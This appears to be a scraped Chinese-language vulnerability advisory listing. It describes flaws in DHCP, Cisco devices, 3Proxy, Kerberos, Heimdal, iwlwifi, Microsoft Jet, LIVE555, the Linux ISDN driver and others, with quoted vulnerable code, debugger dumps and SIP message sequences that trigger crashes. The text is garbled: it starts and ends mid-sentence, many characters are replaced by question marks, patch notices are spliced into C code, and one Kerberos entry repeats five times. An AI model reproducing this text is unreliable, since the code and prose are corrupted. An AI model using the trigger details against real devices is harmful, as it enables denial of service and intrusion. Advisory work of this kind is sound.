DHCP_FIXED_LEN+4)这个条件，main_buffer_size就会为小?的正数?         if (option_size <= main_buffer_size - mainbufix) {                 memcpy(&outpacket->options[mainbufix],                     buffer, option_size);                 mainbufix += option_size;                 if (mainbufix < main_buffer_size)                         outpacket->options[mainbufix++] = DHO_END;                 length = DHCP_FIXED_NON_UDP + mainbufix;         } else {                 outpacket->options[mainbufix++] = DHO_DHCP_OPTION_OVERLOAD;                 outpacket->options[mainbufix++] = 1;                 if (option_size >                     main_buffer_size - mainbufix + DHCP_FILE_LEN)                         outpacket->options[mainbufix++] = 3;                 else                         outpacket->options[mainbufix++] = 1;                 memcpy(&outpacket->options[mainbufix],                     buffer, main_buffer_size - mainbufix);用负数的第三个参数触发memcpy(3)调用就会导致覆盖大部分的进程内存?   ftp disabledn/a n/a<---- FTP is Disabled.   Cisco FWSM是Cisco设备上的防火墙服务模块?如果处理了特制的HTTPS请求的话，启用了HTTPS服务器的FWSM可能会重载。HTTPS服务器默认是禁用的?接收HTTPS请求的源IP地址和接口必须符合所配置的http <source IP>  <source interface>命令。例如，如果配置中存在http 10.10.10.0 255.255.255.0命令的话，则仅有来自10.10.10.0/24网络的特制HTTPS请求才会在设备上造成问题?      Cisco 7940型IP电话是一种多功能通讯设备，通过IP网络传递语音信号?Cisco 7940在处理畸形INVITE消息时存在漏洞，远程攻击者可能利用此漏洞导致设备不可用?如果向Cisco 7940 IP电话发送了一系列SIP INVITE消息的话，就可能导致设备看起来在正常工作而实际上无法接收或发起呼叫，继续发送INVITE消息的话就会导致设备重启?攻击者所发送的SIP INVITE消息中的Request-URI部分应不包含有用户名，如INVITE sip:XXX.XXX.XXX.XXX SIP/2.0。需要发?次才能导致设备拒绝服务，如下所示： X ----------------------- INVITE (Call-ID #1) -----------------------> Cisco 7940X <------------------ 100 Trying (Call-ID #1) --------------------- Cisco 7940 ....--------5 New Dialogs like the previous-------- ....X ----------------------- INVITE (Call-ID #7) -----------------------> Cisco 7940X <------------------ 486 Busy (Call-ID #7) --------------------- Cisco 7940-------- DoS for aproximatly 3 minutes ------X <------------------ 486 Busy (Call-ID #1) --------------------- Cisco 7940 X <------------------ 486 Busy (Call-ID #2) --------------------- Cisco 7940 X <------------------ 486 Busy (Call-ID #3) --------------------- Cisco 7940X <------------------ 486 Busy (Call-ID #4) --------------------- Cisco 7940X <------------------ 486 Busy (Call-ID #5) --------------------- Cisco 7940 X <------------------ 486 Busy (Call-ID #6) --------------------- Cisco 7940       3Proxy是一款小型的代理软件?3Proxy在处理连接时存在漏洞，远程攻击者可能利用此漏洞控制服务器?3Proxy的ftpprchild()函数中存在双重释放漏洞：...if (!strncasecmp((char *)buf, \"OPEN \", 5)){    if(param->hostname) myfree(param->hostname); <--first free    if(parsehostname((char *)buf+5, param, 21)){RETURN(803);}the parsehostname will free param->hostname again.int parsehostname(char *hostname, struct clientparam *param, unsignedshort port){        char *sp;            if(!hostname || !*hostname)return 1;        if ( (sp = strchr(hostname, &#039;:&#039;)) ) *sp = 0;        if(param->hostname) myfree(param->hostname); <-- double free远程攻击者可以通过向FTP代码模块多次发送OPEN命令触发这个漏洞，导致服务不稳定或崩溃?      Firefly是Roku SoundBridge和iTunes所使用的开源媒体服务器?Firefly在处理畸形文件时存在漏洞，远程攻击者可能利用此漏洞导致服务器崩溃?在Firefly的webserver.c文件中，ws_getheaders函数?31行存在空指针引用漏洞。如果文件头中的某行(非第一?不包含\"&#039;:\"的话，就会触发这个漏洞，因为strsep(&last, &#039;:&#039;)会对变量last分配NULL，然后代码试图引用last?    strsep(&last,\":\");    if(last==first) {        DPRINTF(E_WARN,L_WS,\"Thread %d: Invalid header: 目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载?<a href=\"http://sourceforge.net/project/showfiles.php?group_id=98211\" target=\"_blank\" rel=\"nofollow\">http://sourceforge.net/project/showfiles.php?group_id=98211</a>\n\",            pwsc->threadno,first);    } else {        while(*last==&#039; &#039;)            last++;webserver.c文件的ws_decodepassword函数?399行也存在空指针引用漏洞。header变量会一直递增，直到遇到空字符，因此可能会越界引用内存?    /* xlat table is initialized */    while(*header != &#039; &#039;)    header++;\"       Kerberos是一款广泛使用的使用强壮的加密来验证客户端和服务器端的网络协议。MIT Kerberos 5是一种常用的开源Kerberos实现?Kerberos的实现上存在多个内存破坏漏洞，远程攻击者可能利用这些漏洞导致服务程序崩溃?gssftp的ftpd是Kerberos加密的FTP服务器，可通过Kerberos 5认证。在ftpd.c的reply()函数中存在未初始化的指针? void reply(int n, char *fmt, ...)        {...(1)  int length, kerror; <---- declared length  without initializer                        if (n) sprintf(in, \"%d%c\", n, cont_char);                        else in[0] = &#039;\0&#039;;                        strncat(in, buf, sizeof (in) - strlen(in) - 1);        #ifdef KRB5_KRB4_COMPAT                        if (strcmp(auth_type, \"KERBEROS_V4\") == 0) {                                if (clevel == PROT_P)                                        length = krb_mk_priv((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             schedule,&kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                else                                        length = krb_mk_safe((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             &kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                if (length == -1) {                                        syslog(LOG_ERR,                                               \"krb_mk_目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://web.mit.edu/kerberos/www/advisories/index.html\" target=\"_blank\" rel=\"nofollow\">http://web.mit.edu/kerberos/www/advisories/index.html</a>  failed forKERBEROS_V4\",                                               clevel == PROT_P ? \"priv\" :\"safe\");                                        fputs(in,stdout);                                }                        } else        #endif /* KRB5_KRB4_COMPAT */        #ifdef GSSAPI                        /* reply (based on level) */                        if (strcmp(auth_type, \"GSSAPI\") == 0) {                                gss_buffer_desc in_buf, out_buf;                                OM_uint32 maj_stat, min_stat;                                int conf_state;                                in_buf.value = in;                                in_buf.length = strlen(in);                                maj_stat = gss_seal(&min_stat, gcontext,                                                    clevel == PROT_P, /*private */                                                    GSS_C_QOP_DEFAULT,                                                    &in_buf, &conf_state,                                                    &out_buf);                                if (maj_stat != GSS_S_COMPLETE) {        #if 0        /* Don&#039;t setup an infinite loop */                                        /* generally need to deal */                                        secure_gss_error(maj_stat, min_stat,                                                       (clevel==PROT_P)?                                                         \"gss_seal ENC didn&#039;tcomplete\":                                                         \"gss_seal MIC didn&#039;tcomplete\");        #endif /* 0 */                                } else if ((clevel == PROT_P) && !conf_state) {        #if 0        /* Don&#039;t setup an infinite loop */                                        secure_error(\"GSSAPI didn&#039;t encryptmessage\");        #endif /* 0 */                                } else {                                        memcpy(out, out_buf.value,                  Kerberos是一款广泛使用的使用强壮的加密来验证客户端和服务器端的网络协议。MIT Kerberos 5是一种常用的开源Kerberos实现?Kerberos的实现上存在多个内存破坏漏洞，远程攻击者可能利用这些漏洞导致服务程序崩溃?gssftp的ftpd是Kerberos加密的FTP服务器，可通过Kerberos 5认证。在ftpd.c的reply()函数中存在未初始化的指针?void reply(int n, char *fmt, ...)        {...(1)  int length, kerror; <---- declared length  without initializer                        if (n) sprintf(in, \"%d%c\", n, cont_char);                        else in[0] = &#039;\0&#039;;                        strncat(in, buf, sizeof (in) - strlen(in) - 1);        #ifdef KRB5_KRB4_COMPAT                        if (strcmp(auth_type, \"KERBEROS_V4\") == 0) {                                if (clevel == PROT_P)                                        length = krb_mk_priv((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             schedule,&kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                else                                        length = krb_mk_safe((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             &kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                if (length == -1) {                                        syslog(LOG_ERR,                                               \"krb_mk_目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://web.mit.edu/kerberos/www/advisories/index.html\" target=\"_blank\" rel=\"nofollow\">http://web.mit.edu/kerberos/www/advisories/index.html</a>  failed forKERBEROS_V4\",                                               clevel == PROT_P ? \"priv\" :\"safe\");                                        fputs(in,stdout);                                }                        } else        #endif /* KRB5_KRB4_COMPAT */        #ifdef GSSAPI                        /* reply (based on level) */                        if (strcmp(auth_type, \"GSSAPI\") == 0) {                                gss_buffer_desc in_buf, out_buf;                                OM_uint32 maj_stat, min_stat;                                int conf_state;                                in_buf.value = in;                                in_buf.length = strlen(in);                                maj_stat = gss_seal(&min_stat, gcontext,                                                    clevel == PROT_P, /*private */                                                    GSS_C_QOP_DEFAULT,                                                    &in_buf, &conf_state,                                                    &out_buf);                                if (maj_stat != GSS_S_COMPLETE) {        #if 0        /* Don&#039;t setup an infinite loop */                                        /* generally need to deal */                                        secure_gss_error(maj_stat, min_stat,                                                       (clevel==PROT_P)?                                                         \"gss_seal ENC didn&#039;tcomplete\":                                                         \"gss_seal MIC didn&#039;tcomplete\");        #endif /* 0 */                                } else if ((clevel == PROT_P) && !conf_state) {        #if 0        /* Don&#039;t setup an infinite loop */                                        secure_error(\"GSSAPI didn&#039;t encryptmessage\");        #endif /* 0 */                                } else {                                        memcpy(out, out_buf.value,                   Kerberos是一款广泛使用的使用强壮的加密来验证客户端和服务器端的网络协议。MIT Kerberos 5是一种常用的开源Kerberos实现?Kerberos的实现上存在多个内存破坏漏洞，远程攻击者可能利用这些漏洞导致服务程序崩溃?gssftp的ftpd是Kerberos加密的FTP服务器，可通过Kerberos 5认证。在ftpd.c的reply()函数中存在未初始化的指针? void reply(int n, char *fmt, ...)        {...(1)  int length, kerror; <---- declared length  without initializer                        if (n) sprintf(in, \"%d%c\", n, cont_char);                        else in[0] = &#039;\0&#039;;                        strncat(in, buf, sizeof (in) - strlen(in) - 1);        #ifdef KRB5_KRB4_COMPAT                        if (strcmp(auth_type, \"KERBEROS_V4\") == 0) {                                if (clevel == PROT_P)                                        length = krb_mk_priv((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             schedule,&kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                else                                        length = krb_mk_safe((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             &kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                if (length == -1) {                                        syslog(LOG_ERR,                                               \"krb_mk_目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://web.mit.edu/kerberos/www/advisories/index.html\" target=\"_blank\" rel=\"nofollow\">http://web.mit.edu/kerberos/www/advisories/index.html</a>  failed forKERBEROS_V4\",                                               clevel == PROT_P ? \"priv\" :\"safe\");                                        fputs(in,stdout);                                }                        } else        #endif /* KRB5_KRB4_COMPAT */        #ifdef GSSAPI                        /* reply (based on level) */                        if (strcmp(auth_type, \"GSSAPI\") == 0) {                                gss_buffer_desc in_buf, out_buf;                                OM_uint32 maj_stat, min_stat;                                int conf_state;                                in_buf.value = in;                                in_buf.length = strlen(in);                                maj_stat = gss_seal(&min_stat, gcontext,                                                    clevel == PROT_P, /*private */                                                    GSS_C_QOP_DEFAULT,                                                    &in_buf, &conf_state,                                                    &out_buf);                                if (maj_stat != GSS_S_COMPLETE) {        #if 0        /* Don&#039;t setup an infinite loop */                                        /* generally need to deal */                                        secure_gss_error(maj_stat, min_stat,                                                       (clevel==PROT_P)?                                                         \"gss_seal ENC didn&#039;tcomplete\":                                                         \"gss_seal MIC didn&#039;tcomplete\");        #endif /* 0 */                                } else if ((clevel == PROT_P) && !conf_state) {        #if 0        /* Don&#039;t setup an infinite loop */                                        secure_error(\"GSSAPI didn&#039;t encryptmessage\");        #endif /* 0 */                                } else {                                        memcpy(out, out_buf.value,                 Wireless WiFi Link是很多笔记本都在使用的无线网卡?Wireless WiFi Link网卡驱动的实现上存在漏洞，远程攻击者可能利用此漏洞导致用户系统不可用?Wireless WiFi Link网卡的iwlwifi驱动中compatible/iwl3945-base.c文件的iwl_set_rate()函数存在空指针引用漏洞：static void iwl_set_rate(struct iwl_priv *priv) {                const struct ieee80211_hw_mode *hw = NULL;                struct ieee80211_rate *rate;                int i;(1) hw = iwl_get_hw_mode(priv, priv->phymode);  <-- not check ret                priv->active_rate = 0;                priv->active_rate_basic = 0; IWL_DEBUG_RATE(\"Setting rates for 802.11%c\n\",                               hw->mode == MODE_IEEE80211A ?                               &#039;a&#039; : ((hw->mode == MODE_IEEE80211B) ? &#039;b&#039; :&#039;g&#039;));(2) for (i = 0; i < hw->num_rates; i++) { <-- null deref.(1)处没有检查iwl_get_hw_mode的返回值，如果返回了NULL就会导致(2)引用空指针。远程攻击者可以利用这个漏洞在模块初始化期间导致客户端内核忙碌?      Heimdal是Kerberos 5的实现，可以免费下载?Heimdal的FTPD服务程序实现上存在内存引用漏洞，远程攻击者可能利用此漏洞导致服务器程序不可用?Heimdal的ftpd.c文件中的gss_userok()函数使用了未初始化的指针?.int     gss_userok(void *app_data, char *username)      {...77              if (data->delegated_cred_handle != GSS_C_NO_CREDENTIAL) {78                 krb5_ccache ccache = NULL; 79 (1)             char* ticketfile;    <---- declared ticketfile  withoutinitializer80                 struct passwd *pw;81                 82                 pw = getpwnam(username);83                 84 (2)             if (pw == NULL) {85                     ret = 1;86                     goto fail;87                 }88      ...110                111     fail:112                if (ccache)113                   krb5_cc_close(gssapi_krb5_context, ccache); 114 (3)            free(ticketfile); <---- free the uninitialized variable115             }(1)处未经初始化便声明了ticketfile文件，如果匹?2)处条件的话，就会未经初始化ticketfile到达(3)，然后释放未经初始化的变量。这可能导致不可预期行为或崩溃等问题?      Xorg X Server是Solaris x86平台上可用的X窗口系统显示服务器之一?X Server的执行程序在处理参数数据时存在漏洞，本地攻击者可能利用此漏洞获取系统文件相关的敏感信息?在执行X时处理安全策略参数的方式存在漏洞，允许远程攻击者通过向X -sp命令传送文件名参数判断是否存在文件。如果在X :1 -sp <file>命令中提供了任意文件或目录的话，但用户得到的返回为\"error opening security policy file <file>\"，则系统中不存在文件或目录；如果返回了\"<file>: invalid security policy file version, ignoring file\"错误消息，则系统中存在文件或目录?      Kerberos是一款广泛使用的使用强壮的加密来验证客户端和服务器端的网络协议。MIT Kerberos 5是一种常用的开源Kerberos实现?Kerberos的实现上存在多个内存破坏漏洞，远程攻击者可能利用这些漏洞导致服务程序崩溃?gssftp的ftpd是Kerberos加密的FTP服务器，可通过Kerberos 5认证。在ftpd.c的reply()函数中存在未初始化的指针? void reply(int n, char *fmt, ...)        {...(1)  int length, kerror; <---- declared length  without initializer                        if (n) sprintf(in, \"%d%c\", n, cont_char);                        else in[0] = &#039;\0&#039;;                        strncat(in, buf, sizeof (in) - strlen(in) - 1);        #ifdef KRB5_KRB4_COMPAT                        if (strcmp(auth_type, \"KERBEROS_V4\") == 0) {                                if (clevel == PROT_P)                                        length = krb_mk_priv((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             schedule,&kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                else                                        length = krb_mk_safe((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             &kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                if (length == -1) {                                        syslog(LOG_ERR,                                               \"krb_mk_目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://web.mit.edu/kerberos/www/advisories/index.html\" target=\"_blank\" rel=\"nofollow\">http://web.mit.edu/kerberos/www/advisories/index.html</a>  failed forKERBEROS_V4\",                                               clevel == PROT_P ? \"priv\" :\"safe\");                                        fputs(in,stdout);                                }                        } else        #endif /* KRB5_KRB4_COMPAT */        #ifdef GSSAPI                        /* reply (based on level) */                        if (strcmp(auth_type, \"GSSAPI\") == 0) {                                gss_buffer_desc in_buf, out_buf;                                OM_uint32 maj_stat, min_stat;                                int conf_state;                                in_buf.value = in;                                in_buf.length = strlen(in);                                maj_stat = gss_seal(&min_stat, gcontext,                                                    clevel == PROT_P, /*private */                                                    GSS_C_QOP_DEFAULT,                                                    &in_buf, &conf_state,                                                    &out_buf);                                if (maj_stat != GSS_S_COMPLETE) {        #if 0        /* Don&#039;t setup an infinite loop */                                        /* generally need to deal */                                        secure_gss_error(maj_stat, min_stat,                                                       (clevel==PROT_P)?                                                         \"gss_seal ENC didn&#039;tcomplete\":                                                         \"gss_seal MIC didn&#039;tcomplete\");        #endif /* 0 */                                } else if ((clevel == PROT_P) && !conf_state) {        #if 0        /* Don&#039;t setup an infinite loop */                                        secure_error(\"GSSAPI didn&#039;t encryptmessage\");        #endif /* 0 */                                } else {                                        memcpy(out, out_buf.value,                  Kerberos是一款广泛使用的使用强壮的加密来验证客户端和服务器端的网络协议。MIT Kerberos 5是一种常用的开源Kerberos实现?Kerberos的实现上存在多个内存破坏漏洞，远程攻击者可能利用这些漏洞导致服务程序崩溃?gssftp的ftpd是Kerberos加密的FTP服务器，可通过Kerberos 5认证。在ftpd.c的reply()函数中存在未初始化的指针?void reply(int n, char *fmt, ...)        {...(1)  int length, kerror; <---- declared length  without initializer                        if (n) sprintf(in, \"%d%c\", n, cont_char);                        else in[0] = &#039;\0&#039;;                        strncat(in, buf, sizeof (in) - strlen(in) - 1);        #ifdef KRB5_KRB4_COMPAT                        if (strcmp(auth_type, \"KERBEROS_V4\") == 0) {                                if (clevel == PROT_P)                                        length = krb_mk_priv((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             schedule,&kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                else                                        length = krb_mk_safe((unsigned char*)in,                                                             (unsigned char*)out,                                                             strlen(in),                                                             &kdata.session,                                                             &ctrl_addr,                                                             &his_addr);                                if (length == -1) {                                        syslog(LOG_ERR,                                               \"krb_mk_目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://web.mit.edu/kerberos/www/advisories/index.html\" target=\"_blank\" rel=\"nofollow\">http://web.mit.edu/kerberos/www/advisories/index.html</a>  failed forKERBEROS_V4\",                                               clevel == PROT_P ? \"priv\" :\"safe\");                                        fputs(in,stdout);                                }                        } else        #endif /* KRB5_KRB4_COMPAT */        #ifdef GSSAPI                        /* reply (based on level) */                        if (strcmp(auth_type, \"GSSAPI\") == 0) {                                gss_buffer_desc in_buf, out_buf;                                OM_uint32 maj_stat, min_stat;                                int conf_state;                                in_buf.value = in;                                in_buf.length = strlen(in);                                maj_stat = gss_seal(&min_stat, gcontext,                                                    clevel == PROT_P, /*private */                                                    GSS_C_QOP_DEFAULT,                                                    &in_buf, &conf_state,                                                    &out_buf);                                if (maj_stat != GSS_S_COMPLETE) {        #if 0        /* Don&#039;t setup an infinite loop */                                        /* generally need to deal */                                        secure_gss_error(maj_stat, min_stat,                                                       (clevel==PROT_P)?                                                         \"gss_seal ENC didn&#039;tcomplete\":                                                         \"gss_seal MIC didn&#039;tcomplete\");        #endif /* 0 */                                } else if ((clevel == PROT_P) && !conf_state) {        #if 0        /* Don&#039;t setup an infinite loop */                                        secure_error(\"GSSAPI didn&#039;t encryptmessage\");        #endif /* 0 */                                } else {                                        memcpy(out, out_buf.value,                   IMP是一款基于Web的强大的邮件程序，它由Horde项目组开发。可使用在Linux/Unix或者Microsoft Windows操作系统下?IMP在处理HTML的数据时存在漏洞，远程攻击者可能利用此漏洞非授权操作邮件?IMP Webmail客户端和Groupware Webmail Edition的HTML过滤器没有过滤掉<frame>?frameset> HTML单元，此外这些应用还未经执行有效性检查便允许用户通过HTTP请求执行某些操作，导致通过引用数字ID删除任意数量的邮件消息，或在用户受骗打开恶意HTML邮件时清除所删除的邮件?      Microsoft Jet数据库是MS Office应用程序中广泛使用的轻型数据库?Jet数据库在处理畸形MDB文件时存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞通过诱使用户处理恶意文件，控制服务器?Office Access在解析MDB文件时会调用Jet数据库引?msjet40.dll)，如果解析了恶意的MDB文件就会在以下代码中触发栈溢出：    C:\Windows\System32\msjet40.dll，版本为4.0.8618.0    .text:1B0B72BB                 mov     ecx, edx        ; ecx=0x5200    .text:1B0B72BD                 mov     esi, edi        ; esi pointto the datas    .text:1B0B72BF                 mov     ebp, ecx           ; whichcan be find in the mdb file    .text:1B0B72C1                 lea     edi, [esp+40h]  ; edi pointto stack memory    .text:1B0B72C5                 shr     ecx, 2    .text:1B0B72C8                 rep movsd               ; stack overflow!!    .text:1B0B72CA                 mov     ecx, ebp    .text:1B0B72CC                 mov     eax, [eax+1]    .text:1B0B72CF                 and     ecx, 3    .text:1B0B72D2                 rep movsb以下为调试信息：    eax=05f5cb67 ebx=05e66458 ecx=00005200 edx=00005200 esi=05f5cd12edi=0013db60    eip=1b0b72c5 esp=0013db20 ebp=00005200 iopl=0         nv up ei plnz ac pe nc    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000efl=00000216    msjet40!Ordinal55+0x23cd8:    1b0b72c5 c1e902          shr     ecx,2    0:000> u eip    msjet40!Ordinal55+0x23cd8:    1b0b72c5 c1e902          shr     ecx,2    1b0b72c8 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]    1b0b72ca 8bcd            mov     ecx,ebp    1b0b72cc 8b4001          mov     eax,dword ptr [eax+1]    1b0b72cf 83e103          and     ecx,3    1b0b72d2 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]    1b0b72d4 8bb424d4000000  mov     esi,dword ptr [esp+0D4h]    1b0b72db 8b4b28          mov     ecx,dword ptr [ebx+28h]    0:000> db esi    05f5cd12  00 4f 00 53 00 7e 00 31-00 5c 00 56 00 42 00 41  .O.S.~.1.\.V.B.A    05f5cd22  00 5c 00 56 00 42 00 41-00 36 00 5c 00 56 00 42  .\.V.B.A.6.\.V.B    05f5cd32  00 45 00 36 00 2e 00 44-00 4c 00 4c 00 23 00 56  .E.6...D.L.L.#.V    05f5cd42  00 69 00 73 00 75 00 61-00 6c 00 20 00 42 00 61  .i.s.u.a.l. .B.a    05f5cd52  00 73 00 69 00 63 00 20-00 46 00 6f 00 72 00 20  .s.i.c. .F.o.r.    05f5cd62  00 41 00 70 00 70 00 6c-00 69 00 63 00 61 00 74  .A.p.p.l.i.c.a.t    05f5cd72  00 69 00 6f 00 6e 00 73-00 00 00 00 00 00 00 00  .i.o.n.s........    05f5cd82  00 00 00 00 00 12 01 2a-00 5c 00 47 00 7b 00 34  .......*.\.G.{.4    0:000> db edi    0013db60  09 00 00 00 01 00 00 00-18 00 00 00 9a 51 00 1b  .............Q..    0013db70  86 ce 00 1b 00 c0 f5 05-02 00 00 00 e8 dc 13 00  ................    0013db80  22 7c 00 1b 0c 11 f4 05-e8 dc 13 00 c0 10 f4 05  \"|..............    0013db90  3c cd 00 1b c0 10 f4 05-00 c0 f5 05 9c 78 e6 05  <............x..    0013dba0  e8 dc 13 00 05 10 92 7c-38 78 e6 05 eb cb 00 1b  .......|8x......    0013dbb0  80 9f a4 05 b0 98 a4 05-01 00 00 00 f2 cb 00 1b  ................    0013dbc0  9c 78 e6 05 e8 dc 13 00-4c dc 13 00 4c dc 13 00  .x......L...L...    0013dbd0  01 00 00 00 60 f3 00 1b-80 9f a4 05 02 00 00 00  ....`...........请注意由于这是Jet引擎中的漏洞，因此一些网络空间供应商也可能受影响。攻击者可以上?asp?mdb文件，并通过ADODB.Connection服务器对象利用这个漏洞?      LIVE555 Media Server是一款RTSP服务器程序，可提供各种媒体文件流服务?LIVE555媒体服务器在处理畸形的请求数据时存在漏洞，远程攻击者可能利用此漏洞导致服务器不可用?LIVE555媒体服务器的parseRTSPRequestString()函数没有检查客户端数据的数?reqStrSize)是否大于或等?字节。因为该函数使用了无符数字，因此7 - 8不是-1而是4294967295，这就导致到达了分配内存的末尾而出现崩溃。以下是liveMedia/RTSPCommon文件中有漏洞的代码：Boolean parseRTSPRequestString(char const* reqStr,unsigned reqStrSize,...unsigned i;for (i = 0; i < resultCmdNameMaxSize-1 && i < reqStrSize; ++i) {...// Skip over the prefix of any \"rtsp://\" or \"rtsp:/\" URL that follows:unsigned j = i+1;while (j < reqStrSize && (reqStr[j] == &#039; &#039; || reqStr[j] == &#039;\t&#039;)) ++j;for (j = i+1; j < reqStrSize-8; ++j) {...       Linux Kernel是开放源码操作系统Linux所使用的内核?Linux Kernel实现上存在漏洞，本地攻击者可能利用此漏洞提升权限?Linux Kernel的drivers/isdn/i4l/isdn_net.c文件中的isdn_net_setcfg()函数在处理发送给ISDN伪设?/dev/isdnctrl)的IOCTL配置请求时存在缓冲区溢出漏洞?isdn_ioctl (drivers/isdn/i4l/isdn_common.c):1270 isdn_ioctl(struct inode *inode, struct file *file, uint cmd, ulong arg)        ...        ...1410                 case IIOCNETSCF:1411                         /* Set configurable parameters of a network-interface */1412                         if (arg) {1413                                 if (copy_from_user(&cfg, argp, sizeof(cfg)))   *** <- cfg is user-controlled1414                                         return -EFAULT;1415                                 return isdn_net_setcfg(&cfg);      *** <-call isdn_net_setcfg()1416                         } else1417                                 return -EINVAL;        ...?413行，cfg是从用户空间读取的，因此受用户控制。在1415行调用了isdn_net_setcfg()函数?cfg作为参数传送给了isdn_net_setcfg()?isdn_net_setcfg (drivers/isdn/i41/isdn_net.c):2664 isdn_net_setcfg(isdn_net_ioctl_cfg * cfg)2665 {        ...2777                 if (cfg->exclusive > 0) {2778                         unsigned long flags;2779 2780                         /* If binding is exclusive, try to grab the channel */2781                         spin_lock_irqsave(&dev->lock, flags);2782                         if ((i = isdn_get_free_channel(ISDN_USAGE_NET,2783                                 lp->l2_proto, lp->l3_proto, drvidx,2784                                 chidx, lp->msn)) < 0) {2785                                 /* Grab failed, because desired channel is in use */2786                                 lp->exclusive = -1;2787                                 spin_unlock_irqrestore(&dev->lock, flags);2788                                 return -EBUSY;2789                         }2790                         /* All went ok, so update isdninfo */2791                         dev->usage[i] = ISDN_USAGE_EXCLUSIVE;2792                         isdn_info_update();2793                         spin_unlock_irqrestore(&dev->lock, flags);2794                         lp->exclusive = i;2795                 } else {2796                         /* Non-exclusive binding or unbind. */2797                         lp->exclusive = -1;2798                         if ((lp->pre_device != -1) && (cfg->exclusive == -1)) {2799                                 isdn_unexclusive_channel(lp->pre_device, lp->pre_channel);2800                                 isdn_free_channel(lp->pre_device, lp->pre_channel, ISDN_USAGE_NET);2801                                 drvidx = -1;2802                                 chidx = -1;2803                         }2804                 }2805                 strcpy(lp->msn, cfg->eaz);         *** <- Possible overrun of lp->msn by cfg-eaz2806                 lp->pre_device = drvidx;2807                 lp->pre_channel = chidx;2808                 lp->onhtime = cfg->onhtime;2809                 lp->charge = cfg->charge;        ...2884         return -ENODEV;2885 }?805行调用了strcpy()，lp->msn参数大小?2，cfg->eaz大小?56。由?cfg的数据是用户可控的，因此cfg->eaz也是用户可控的，这样就可以通过cfg->eaz字符串覆盖目标字符串lp->msn。如果cfg->eaz字符串的长度大于32的话，就可以触发缓冲区溢出?      Plumtree Foundation是流行的企业门户网站解决方案，目前已被BEA收购并成为AquaLogic产品家族的一部分?Plumtree Foundation的实现上存在多个信息泄露漏洞，远程攻击者可能利用此漏洞获取某些敏感信息有助于进一步攻击?在每次请求的HTML页面的HTML标注底部都会显示承载BEA Plumtree服务器的内部主机名，如下所示： <!--Hostname: websvr01-->;此外在每次请求的HTML页面的HTML标注底部都会显示具体版本和build日期?<!--Portal Version: 6.0.1.218452, Changelist: 218452, Build Date: 04/07/2006 at 10:13 AM-->这些信息可能被恶意用户利用非法访问内部系统的资源，或根据版本号降低攻击尝试的次数?      Cisco 7940型IP电话是一种多功能通讯设备，通过IP网络传递语音信号?Cisco 7940在处理畸形INVITE消息时存在漏洞，远程攻击者可能利用此漏洞导致设备不可用?如果向Cisco 7940 IP电话发送了一系列SIP INVITE消息的话，就可能导致设备看起来在正常工作而实际上无法接收或发起呼叫，继续发送INVITE消息的话就会导致设备重启?攻击者所发送的SIP INVITE消息中的Request-URI部分应不包含有用户名，如INVITE sip:XXX.XXX.XXX.XXX SIP/2.0。需要发?次才能导致设备拒绝服务，如下所示： X ----------------------- INVITE (Call-ID #1) -----------------------> Cisco 7940X <------------------ 100 Trying (Call-ID #1) --------------------- Cisco 7940 ....--------5 New Dialogs like the previous-------- ....X ----------------------- INVITE (Call-ID #7) -----------------------> Cisco 7940X <------------------ 486 Busy (Call-ID #7) --------------------- Cisco 7940-------- DoS for aproximatly 3 minutes ------X <------------------ 486 Busy (Call-ID #1) --------------------- Cisco 7940 X <------------------ 486 Busy (Call-ID #2) --------------------- Cisco 7940 X <------------------ 486 Busy (Call-ID #3) --------------------- Cisco 7940X <------------------ 486 Busy (Call-ID #4) --------------------- Cisco 7940X <------------------ 486 Busy (Call-ID #5) --------------------- Cisco 7940 X <------------------ 486 Busy (Call-ID #6) --------------------- Cisco 7940\"       Nokia N95是诺基亚推出的一款高端手机，支持SIP电话通讯?N95手机的SIP电话客户端实现上存在漏洞，远程攻击者可能利用此漏洞导致手机的SIP功能不可用?如果N95手机打开了SIP电话客户端，用户就可以发送两个不同的SIP对话，其中第一个初始了INVITE事件但立即关闭，然后当第二个事件初始正常的INVITE消息时就会导致手机变得没有响应。以下是消息序列示例? X ------------------------- INVITE -----------------------> Nokiav12X <---------------------- 100 Trying ---------------------- Nokiav12 X ------------------------- CANCEL -----------------------> Nokiav12 X <----------------- OK (to the Cancel) ------------------- Nokiav12 X <---------------- 487 Request Terminated ---------------- Nokiav12--------新的对话--------X ------------------------- INVITE -----------------------> Nokiav12X <---------------------- 100 Trying ---------------------- Nokiav12X <---------------------- 180 Trying ---------------------- Nokiav12       yaSSL是一个开源的SSL的开发库?yaSSL实现上存在多个远程溢出及无效内存访问问题，远程攻击者可能利用此漏洞控制服务器?-------------------------------------------A] 